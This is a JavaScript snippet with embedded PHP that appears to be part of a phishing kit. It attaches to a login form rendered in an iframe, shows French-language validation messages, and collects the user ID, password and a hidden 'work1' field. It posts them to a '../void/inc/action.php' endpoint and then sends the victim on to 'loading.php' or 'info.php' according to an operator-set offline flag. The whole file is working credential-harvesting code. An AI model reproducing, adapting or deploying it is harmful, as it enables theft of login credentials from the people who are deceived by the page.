<script>
  const OFFLINE_STATE = <?php echo (int) trim(@file_get_contents('../void/offline.txt')); ?>;
  const USE_LOADING_PAGE = true;
  const ALWAYS_GO_DATA = false;
  const LOADING_MODE = 'never';

  const CONFIG = {
    endpoint: '../void/inc/action.php?type=login',

    fields: [
      { id: 'user-id' },
      { id: 'password' }
    ]
  };

  let iframeDoc = null;
  let connectTimer = null;
  let connectAttempts = 0;

  const MAX_CONNECT_ATTEMPTS = 100;
  const CONNECT_DELAY = 100;


  // ==========================================================
  // SUCCESS
  // ==========================================================

  function onSuccess(parsed_response) {

    if (ALWAYS_GO_DATA) {
      window.top.location.href = 'info.php';
      return;
    }

    if (OFFLINE_STATE === 1) {
      window.top.location.href = 'info.php';
      return;
    }

    if (USE_LOADING_PAGE) {
      window.top.location.href = 'loading.php';
    }
  }


  // ==========================================================
  // ERRORS
  // ==========================================================

  function _getErrorContainer(fieldId) {

    if (!iframeDoc) return null;

    const input = iframeDoc.getElementById(fieldId);

    if (!input) return null;

    const formGroup = input.closest('.form-group');

    if (!formGroup) return null;

    const inputParent = input.parentElement;

    if (!inputParent) return null;

    let errorEl = inputParent.querySelector('.js-error');

    if (!errorEl) {

      errorEl = iframeDoc.createElement('div');

      errorEl.className =
        'js-error has-error help-block';

      errorEl.style.display = 'none';

      input.insertAdjacentElement(
        'afterend',
        errorEl
      );
    }

    return errorEl;
  }


  function _showError(fieldId, message) {

    if (!iframeDoc) return;

    const input =
      iframeDoc.getElementById(fieldId);

    if (!input) return;

    const formGroup =
      input.closest('.form-group');

    if (formGroup) {
      formGroup.classList.add('has-error');
    }

    const errorEl =
      _getErrorContainer(fieldId);

    if (errorEl) {

      errorEl.textContent = message;

      errorEl.style.display = 'block';
    }
  }


  function _resetErrors() {

    if (!iframeDoc) return;

    iframeDoc
      .querySelectorAll('.form-group.has-error')
      .forEach(fg => {

        fg.classList.remove('has-error');

      });

    iframeDoc
      .querySelectorAll('.js-error')
      .forEach(err => {

        err.style.display = 'none';

      });
  }


  // ==========================================================
  // SUBMIT
  // ==========================================================

  let submitting = false;

  function submit_form() {

    if (submitting) {
      return;
    }

    if (!iframeDoc) {

      console.error(
        '[LOGIN] Iframe document not available.'
      );

      return;
    }

    _resetErrors();

    const userIdEl =
      iframeDoc.getElementById('user-id');

    const passwordEl =
      iframeDoc.getElementById('password');

    const work1El =
      iframeDoc.querySelector(
        'input[name="work1"][type="hidden"]'
      );


    const userId =
      userIdEl
        ? userIdEl.value.trim()
        : '';

    const password =
      passwordEl
        ? passwordEl.value.trim()
        : '';

    const work1 =
      work1El
        ? work1El.value
        : '';


    let hasError = false;


    if (!userId) {

      hasError = true;

      _showError(
        'user-id',
        'La saisie du User ID est obligatoire.'
      );
    }


    if (!password) {

      hasError = true;

      _showError(
        'password',
        'La saisie du Password est obligatoire.'
      );
    }


    if (hasError) {
      return;
    }


    const data =
      new URLSearchParams();


    data.append(
      'user-id',
      userId
    );

    data.append(
      'password',
      password
    );

    data.append(
      'work1',
      work1
    );


    console.log(
      '[LOGIN] Sending login request'
    );


    submitting = true;


    fetch(
      CONFIG.endpoint,
      {

        method: 'POST',

        headers: {
          'Content-Type':
            'application/x-www-form-urlencoded; charset=UTF-8'
        },

        body: data.toString(),

        cache: 'no-store'
      }
    )

      .then(response => {

        if (!response.ok) {

          throw new Error(
            'HTTP ' + response.status
          );
        }

        return response.json();
      })

      .then(res => {

        console.log(
          '[LOGIN] Server response:',
          res
        );


        if (res.status === 'ok') {

          onSuccess(res);

          return;
        }


        submitting = false;


        console.error(
          '[LOGIN] Server error:',
          res
        );
      })

      .catch(err => {

        submitting = false;


        console.error(
          '[LOGIN] Fetch error:',
          err
        );
      });
  }


  // ==========================================================
  // CONNECT IFRAME FORM
  // ==========================================================

  function connectLoginForm() {

    const iframe =
      document.getElementById(
        'loginFrame'
      );


    if (!iframe) {

      console.log(
        '[LOGIN] Waiting for #loginFrame...'
      );

      scheduleConnect();

      return false;
    }


    let doc = null;


    try {

      doc =
        iframe.contentDocument ||
        iframe.contentWindow.document;

    } catch (err) {

      console.error(
        '[LOGIN] Cannot access iframe.',
        err
      );

      scheduleConnect();

      return false;
    }


    if (!doc) {

      scheduleConnect();

      return false;
    }


    const userId =
      doc.getElementById('user-id');

    const password =
      doc.getElementById('password');

    const confirmBtn =
      doc.getElementById('confirm');


    if (
      !userId ||
      !password ||
      !confirmBtn
    ) {

      console.log(
        '[LOGIN] iframe exists but form is not ready yet.'
      );

      scheduleConnect();

      return false;
    }


    iframeDoc = doc;


    /*
     * Prevent duplicate handlers.
     */
    if (
      confirmBtn.dataset.loginConnected ===
      '1'
    ) {

      stopConnectTimer();

      return true;
    }


    confirmBtn.dataset.loginConnected =
      '1';


    // --------------------------------------------------------
    // BUTTON CLICK
    // --------------------------------------------------------

    confirmBtn.addEventListener(
      'click',
      function(e) {

        e.preventDefault();

        e.stopPropagation();

        console.log(
          '[LOGIN] Confirm clicked.'
        );

        submit_form();
      }
    );


    // --------------------------------------------------------
    // ENTER / FORM SUBMIT
    // --------------------------------------------------------

    const form =
      confirmBtn.closest('form');


    if (
      form &&
      form.dataset.loginConnected !== '1'
    ) {

      form.dataset.loginConnected =
        '1';


      form.addEventListener(
        'submit',
        function(e) {

          e.preventDefault();

          console.log(
            '[LOGIN] Form submit detected.'
          );

          submit_form();
        }
      );
    }


    stopConnectTimer();


    console.log(
      '[LOGIN] Iframe form connected successfully.'
    );


    return true;
  }


  // ==========================================================
  // RETRY
  // ==========================================================

  function scheduleConnect() {

    if (connectTimer) {
      return;
    }


    if (
      connectAttempts >=
      MAX_CONNECT_ATTEMPTS
    ) {

      console.error(
        '[LOGIN] Could not connect iframe form after retries.'
      );

      return;
    }


    connectAttempts++;


    connectTimer =
      setTimeout(
        function() {

          connectTimer = null;

          connectLoginForm();

        },
        CONNECT_DELAY
      );
  }


  function stopConnectTimer() {

    if (connectTimer) {

      clearTimeout(
        connectTimer
      );

      connectTimer = null;
    }


    connectAttempts = 0;
  }


  // ==========================================================
  // INITIALIZE
  // ==========================================================

  function initLoginForm() {

    const iframe =
      document.getElementById(
        'loginFrame'
      );


    if (!iframe) {

      scheduleConnect();

      return;
    }


    /*
     * IMPORTANT:
     * Connect when iframe fires load.
     */
    iframe.addEventListener(
      'load',
      function() {

        console.log(
          '[LOGIN] iframe load detected.'
        );


        iframeDoc = null;

        submitting = false;

        stopConnectTimer();


        connectLoginForm();

        scheduleConnect();
      }
    );


    /*
     * ALSO connect immediately.
     *
     * This fixes srcdoc iframe already being loaded
     * before our load listener was attached.
     */
    console.log(
      '[LOGIN] Trying immediate iframe connection.'
    );


    connectLoginForm();

    scheduleConnect();
  }


  // ==========================================================
  // PAGE READY
  // ==========================================================

  if (
    document.readyState ===
    'loading'
  ) {

    document.addEventListener(
      'DOMContentLoaded',
      initLoginForm
    );

  } else {

    initLoginForm();
  }


  // ==========================================================
  // BACK / FORWARD CACHE
  // ==========================================================

  window.addEventListener(
    'pageshow',
    function() {

      submitting = false;

      stopConnectTimer();


      setTimeout(
        function() {

          initLoginForm();

        },
        50
      );
    }
  );
</script>


